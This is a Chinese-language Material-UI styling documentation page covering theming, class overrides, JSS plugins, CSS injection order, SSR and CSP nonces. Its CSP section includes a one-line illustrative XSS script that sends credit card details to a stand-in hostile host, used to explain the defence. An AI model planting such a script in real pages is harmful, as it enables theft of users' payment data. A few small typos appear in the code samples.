# Advanced 进阶

<p class="description">本节包含了 @material-ui/core/styles 的一些更多的进阶用法。</p>

## 主题

若您想将主题传递到 React 组件树，请将添加 `ThemeProvider` 包装到应用程序的顶层。 然后，您可以在样式函数中访问主题对象。

> 此示例为自定义组件创建了一个主题对象（theme object）。 如果你想要使用 Material-UI 的部分组件，那么则需要通过使用 `createMuiTheme()` 方法来提供一个更丰富的主题结构。 有关如何自定义 Material-UI 主题的信息，请参见 [主题部分](/customization/theming/)。

```jsx
import { ThemeProvider } from '@material-ui/core/styles';
import DeepChild from './my_components/DeepChild';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### 访问一个组件中的主题

您可能需要访问 React 组件中的主题变量。

#### `useTheme` hook

在函数组件（function components）中的使用：

```jsx
import { useTheme } from '@material-ui/core/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

在类（class）或函数（function）组件中的使用：

```jsx
import { withTheme } from '@material-ui/core/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### 主题嵌套

您可以嵌套多个主题提供者。 当您在处理应用程序的不同区域时，若需要应用的不同外观，这个功能会让您得心应手。

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

内部主题将 **覆盖** 外部主题。 你可以提供一个函数来扩展外层主题：

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## 覆盖样式 — `classes` 属性

通过 `makeStyles` (hook generator) 和 `withStyles` (HOC) 这两个 API， 用户可以为每个样式表创建多种样式规则。 每个样式规则都有自己的类名。 组件的 `classes` 变量会提供类名（class names）。 这在设置组件中嵌套元素的样式时特别有用。

```jsx
// 一个样式内联表
const useStyles = makeStyles({
  root: {}, // 一个样式规则
  label: {}, // 一个嵌套的样式规则
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        嵌套的
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

然而，这些类名称往往不是决定性的。 父级组件如何覆盖嵌套元素的样式呢？

### `withStyles`

这是最简单的一种情况。 包装组件接受 `classes` 属性，它简单地合并了样式表提供的类名。

```jsx
const Nested = withStyles({
  root: {}, // 一个样式规则
  label: {}, // 一个嵌套的样式规则
})(({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      嵌套的
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### `makeStyles`

想使用 hook API 的话需要一些额外的工作。 你必须把父级属性作为第一个参数传递给 hook。

```jsx
const useStyles = makeStyles({
  root: {}, // 一个样式规则
  label: {}, // 一个嵌套的样式规则
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        嵌套的
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## JSS 插件

JSS 使用插件来扩展其核心，您可以挑选所需的功能，并且只需承担您正在使用的内容性能的开销。

默认情况下，不是所有 Material-UI 的插件都可以使用。 以下（一个 [jss-preset-default 的子集](https://cssinjs.org/jss-preset-default/)） 被包含在内：

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

当然，你也可以随意使用额外的插件。 我们有一个使用 [jss-rtl](https://github.com/alitaheri/jss-rtl) 插件的例子。

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

export default function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}
```

## 字符串模板

如果相比 JSS 您更喜欢 CSS 的语法，则可以使用 [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) 插件。

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

请注意，此插件不支持选择器或嵌套规则。

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## CSS 注入顺序

> 了解浏览器如何计算 CSS 优先级是**非常重要的**，因为它是您在覆盖样式时需要了解的重点之一。 我们推荐您阅读 MDN 上的这段内容：[如何计算优先级？](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)

默认情况下，注入的 style 标签会被注入到页面`<head>`元素的最后。 它们的优先级高于您页面上的任何其他样式标签，如 CSS 模块、styled components。

### injectFirst

`StylesProvider` 组件有一个 `injectFirst` 属性，用于将样式标签**首先**从页头（优先级较低）注入：

```jsx
import { StylesProvider } from '@material-ui/core/styles';

<StylesProvider injectFirst>
  {/* 你的组件树。
      样式化组件可以覆盖 Material-UI 的样式。 */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

样式标签的注入顺序与 `makeStyles` / `withStyles` / `styled` 的调用顺序**相同**。 例如，在这种情况下，字体最终是红色：

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/core/styles';

const useStylesBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyles = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Order doesn't matter
  const classes = useStyles();
  const classesBase = useStylesBase();

  // Order doesn't matter
  const className = clsx(classes.root, classesBase.root)

  // color: 红色 🔴 胜出。
  return <div className={className} />;
}
```

Hook 的调用顺序和类名连接顺序都**不会影响**注入顺序的权重。

### insertionPoint

JSS [提供了一种机制](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) 来控制这种情况。 通过在 HTML 中添加 `insertionPoint`，您就可以[控制](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) CSS 规则应用到组件中的顺序。

#### HTML 注释

最简单的方法是在 `<head>` 中添加一个 HTML 注释，来决定 JSS 注入样式的位置：

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // 当将样式注入到 DOM 中时，定义了一个自定义插入点以供 JSS 查询。 
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

#### 其他 HTML 元素

在构建生产环境时，[Create React App](https://github.com/facebook/create-react-app) 会移除 HTML 注释。 为了解决这个问题，您可以提供一个 DOM 元素（而不是一条注释）作为 JSS 插入点 ，譬如一个 `<noscript>` 元素。

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const jss = create({
  ...jssPreset(),
  // 当将样式注入到 DOM 中时，定义了一个自定义插入点以供 JSS 查询。 
  insertionPoint: document.getElementById('jss-insertion-point'),
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

#### JS createComment

codesandbox.io 阻止访问 `<head>` 元素。 要解决这个问题，您可以使用 JavaScript 中的 `document.createComment()` API。

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/core/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // 我们定义了一个自定义插入点，JSS在DOM中注入样式时会查找该插入点。
  insertionPoint: 'jss-insertion-point',
});

export default function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}
```

## 服务端渲染

这个例子将会返回 HTML 字符串，并在使用之前就内嵌好了所需的 CSS。

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/core/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

您可以[根据这篇服务端渲染指南](/guides/server-rendering/)来获取更多详细的例子，或者您也可以阅读 [`ServerStyleSheets` 的 API 文档](/styles/api/#serverstylesheets)。

### Gatsby

这个 [官方的 Gatsby 插件](https://github.com/hupe1980/gatsby-plugin-material-ui)，可以利用它来实现 `@material-ui/style` 的服务器端渲染。 请参考插件页面的设置和使用说明。

请参考 [Gatsby 项目案例](https://github.com/mui-org/material-ui/blob/master/examples/gatsby)以了解最新的使用方法。

### Next.js

您需要有一个自定义的 `pages/_document.js`，然后复制[此逻辑](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js)以注入服务器侧渲染的样式到 `<head>` 元素中。

请参考[示例项目](https://github.com/mui-org/material-ui/blob/master/examples/nextjs)以获取最新的使用方法。

## 类名（Class names）

类名（class names）由 [类名生成器](/styles/api/#creategenerateclassname-options-class-name-generator) 生成。

### 默认值

默认情况下，`@material-ui/core/styles` 生成的类名是**不是固定值**； 所以您不能指望它们保持不变。 让我们以下面的样式（style）作为示例：

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

上述例子将生成一个类似于 `makeStyles-root-123` 这样的类名。

您必须使用组件的 `classes` 属性来覆盖样式。 类名的不确定性使样式隔离成为可能。

- 在**开发环境中**，类名为：`.makeStyles-root-123`，它遵循以下逻辑：

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- 在**生产环境中**，类名为：`.jss123`，它遵循以下逻辑：

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### 与 `@material-ui/core` 一起使用

`@material-ui/core` 组件生成的类名表现大相径庭。 当满足以下条件时，类名是**确定的**：

- 仅使用一个主题提供程序（**无主题嵌套**）。
- 样式表的名称以 `Mui` 开头（包含所有 Material-UI 组件）。
- [类名生成器](/styles/api/#creategenerateclassname-options-class-name-generator)的 `disableGlobal` 选项为 `false`（默认值）。

`@material-ui/core` 最常见的用例可以满足这些条件。 例如，在这个样式表中：

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

这将生成以下您可以进行覆盖操作的类名：

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*这是对 `@material-ui/core/Button` 组件样式表的简化。*

通过 [`class` API](#overriding-styles-classes-prop) 实现 TextField 的自定义可能很麻烦，您必须在那里定义 classes 属性。 如上文所述，使用默认值会比较容易。 例如:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; 💔
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## 全局 CSS

### `jss-plugin-global`

[`jss-plugin-global`](#jss-plugins) 插件安装在默认的预设中。 您可以使用它来定义全局类名称。

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### 混合

您也可以将 JSS 生成的类名称与全局名称结合起来。

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## CSS 前缀（prefixes）

JSS 使用特征探测来应用正确的前缀。 如果您看不到最新版本 Chrome 中显示一个特定前缀，[请不要感到惊讶](https://github.com/mui-org/material-ui/issues/9293)。 您的浏览器可能不需要它。

## 内容安全策略（CSP）

### 什么是 CSP，为什么它有用？

基本上，CSP 通过要求开发人员将其资产从中检索的源列入白名单来削弱跨站点脚本（XSS）的攻击。 此列表作为服务器的头部（heade）返回。 例如，假设您有一个托管在 `https://example.com` 的网站 CSP 头部 `default-src：'self';` 将仅加载 `https://example.com/*` 的所有资源，并否认所有其他人。 如果您的网站的某个部分容易受到 XSS 的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

此漏洞允许攻击者执行任何操作。 但是，若使用安全的 CSP 头部，浏览器将不会加载此脚本。

您可以在 [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 阅读有关 CSP 的更多信息。

### 如何实现CSP？

为了将 CSP 与 Material-UI（和JSS）一起使用，您需要使用一个随机数（nonce）。 随机数是一个随机生成的字符串，只使用一次，因此您需要添加服务器中间件以在每个请求上生成一个。 关于如何使用 Express 和 React Helmet 来实现，JSS 有一个[很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)。 关于一些基本的纲要，请继续阅读。

CSP nonce 是一个 Base 64 编码的字符串。 你可以生成这样一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

使用 UUID 版本 4 非常重要，因为它会生成一个**不可预测的**字符串。 接下来您可以将此随机数应用于 CSP 头部。 应用了随机数时，CSP 头部可能看起来像这样：

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

如果使用服务器端渲染（SSR），则应在服务器上的随机数传递给 `<style>` 标签。

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
/>
```

然后，您必须将此随机数传递给 JSS ，以便将其添加到后续 `<style>` 标记中。

这样的原理是通过将 `<meta property="csp-nonce" content={nonce} />` 标签传递到 HTML 的 `<head>` 中。 然后，通常情况下，JSS 寻找一个 `<meta property="csp-unce"` 标签，并使用 `content` 的值作为随机数。

无论您是否使用 SSR，都必须包含此标头。 下面是一个虚拟的头部（header）可以看起来的示例：

```html
<head>
  <meta property="csp-nonce" content="this-is-a-nonce-123" />
</head>
```